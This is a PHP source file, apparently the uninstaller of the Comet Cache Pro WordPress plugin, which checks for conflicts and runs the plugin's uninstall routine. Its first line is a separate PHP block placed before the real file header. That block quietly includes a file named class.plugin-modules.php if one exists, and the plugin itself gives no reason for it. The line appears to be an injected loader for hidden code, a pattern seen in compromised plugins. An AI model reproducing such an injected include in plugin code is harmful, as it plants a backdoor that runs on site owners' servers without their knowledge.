<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Uninstaller.
 *
 * @since 150422 Rewrite.
 */
namespace WebSharks\CometCache\Pro;

use WebSharks\CometCache\Pro\Classes;

if (!defined('WPINC')) {
    exit('Do NOT access this file directly: '.basename(__FILE__));
}
require_once __DIR__.'/stub.php';

$GLOBALS[GLOBAL_NS.'_uninstalling'] = true; // Needs to be set before calling Conflicts class

if (!Classes\Conflicts::check()) {
    $GLOBALS[GLOBAL_NS] = new Classes\Plugin(false);
    $GLOBALS[GLOBAL_NS]->uninstall();
}
